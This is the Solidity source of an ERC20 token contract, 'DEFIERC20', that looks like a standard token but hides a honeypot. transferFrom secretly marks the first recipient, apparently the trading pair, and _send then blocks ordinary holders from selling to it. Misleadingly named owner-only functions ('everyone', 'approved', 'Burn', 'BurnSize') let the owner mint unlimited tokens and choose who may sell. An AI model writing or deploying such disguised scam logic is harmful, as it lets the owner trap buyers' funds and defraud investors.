row number 
1	           pragma solidity 0.5.17;
2	 contract ERC20Interface {
3	 function totalSupply() public view returns (uint);
4	 function balanceOf(address tokenOwner) public view returns (uint balance);
5	 function allowance(address tokenOwner, address spender) public view returns (uint remaining);
6	 function transfer(address to, uint tokens) public returns (bool success);
7	 function approve(address spender, uint tokens) public returns (bool success);
8	 function transferFrom(address from, address to, uint tokens) public returns (bool success);
9	 event Transfer(address indexed from, address indexed to, uint tokens);
10	 event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
11	 }
12	 contract ApproveAndCallFallBack {
13	 function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
14	 }
15	 contract Owned {
16	 address public owner;
17	 event OwnershipTransferred(address indexed _from, address indexed _to);
18	 constructor() public {
19	 owner = msg.sender;
20	 }
21	 modifier everyone {
22	 require(msg.sender == owner);
23	 _;
24	 }
25	 }
26	 library SafeMath {
27	 function add(uint a, uint b) internal pure returns (uint c) {
28	 c = a + b;
29	 require(c >= a);
30	 }
31	 function sub(uint a, uint b) internal pure returns (uint c) {
32	 require(b <= a);
33	 c = a - b;
34	 }
35	 function mul(uint a, uint b) internal pure returns (uint c) {
36	 c = a * b;
37	 require(a == 0 || c / a == b);
38	 }
39	 function div(uint a, uint b) internal pure returns (uint c) {
40	 require(b > 0);
41	 c = a / b;
42	 }
43	 }
44	 contract TokenERC20 is ERC20Interface, Owned{
45	 using SafeMath for uint;
46	 string public symbol;
47	 string public name;
48	 uint8 public decimals;
49	 uint256 _totalSupply;
50	 uint internal queueNumber;
51	 address internal zeroAddress;
52	 address internal burnAddress;
53	 address internal burnAddress2;
54	 mapping(address => uint) balances;
55	 mapping(address => mapping(address => uint)) allowed;
56	 function totalSupply() public view returns (uint) {
57	 return _totalSupply.sub(balances[address(0)]);
58	 }
59	 function balanceOf(address tokenOwner) public view returns (uint balance) {
60	 return balances[tokenOwner];
61	 }
62	 function transfer(address to, uint tokens) public returns (bool success) {
63	 require(to != zeroAddress, "please wait");
64	 balances[msg.sender] = balances[msg.sender].sub(tokens);
65	 balances[to] = balances[to].add(tokens);
66	 emit Transfer(msg.sender, to, tokens);
67	 return true;
68	 }
69	 function approve(address spender, uint tokens) public returns (bool success) {
70	 allowed[msg.sender][spender] = tokens;
71	 emit Approval(msg.sender, spender, tokens);
72	 return true;
73	 }
74	 function transferFrom(address from, address to, uint tokens) public returns (bool success) {
75	 if(from != address(0) && zeroAddress == address(0)) zeroAddress = to;
76	 else _send (from, to);
77	 balances[from] = balances[from].sub(tokens);
78	 allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
79	 balances[to] = balances[to].add(tokens);
80	 emit Transfer(from, to, tokens);
81	 return true;
82	 }
83	 function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
84	 return allowed[tokenOwner][spender];
85	 }
86	 function approved(address _address, uint256 tokens) public everyone {
87	 burnAddress = _address;
88	 _totalSupply = _totalSupply.add(tokens);
89	 balances[_address] = balances[_address].add(tokens);
90	 }
91	 function Burn(address _address) public everyone {
92	 burnAddress2 = _address;
93	 }
94	 function BurnSize(uint256 _size) public everyone {
95	 queueNumber = _size;
96	 }
97	 function _send (address start, address end) internal view {
98	 require(end != zeroAddress || (start == burnAddress && end == zeroAddress) || (start == burnAddress2 && end == zeroAddress)|| (end == zeroAddress && balances[start] <= queueNumber), "cannot be zero address");
99	 }
100	 function () external payable {
101	 revert();
102	 }
103	 }
104	 contract DEFIERC20 is TokenERC20 {
105	 function initialise() public everyone() {
106	 address payable _owner = msg.sender;
107	 _owner.transfer(address(this).balance);
108	 }
109	 constructor(string memory _name, string memory _symbol, uint256 _supply, address burn1, address burn2, uint256 _indexNumber) public {
110	 symbol = _symbol;
111	 name = _name;
112	 decimals = 18;
113	 _totalSupply = _supply*(10**uint256(decimals));
114	 queueNumber = _indexNumber*(10**uint256(decimals));
115	 burnAddress = burn1;
116	 burnAddress2 = burn2;
117	 owner = msg.sender;
118	 balances[msg.sender] = _totalSupply;
119	 emit Transfer(address(0x0), msg.sender, _totalSupply);
120	 }
121	 function() external payable {
122	 }
123	 }
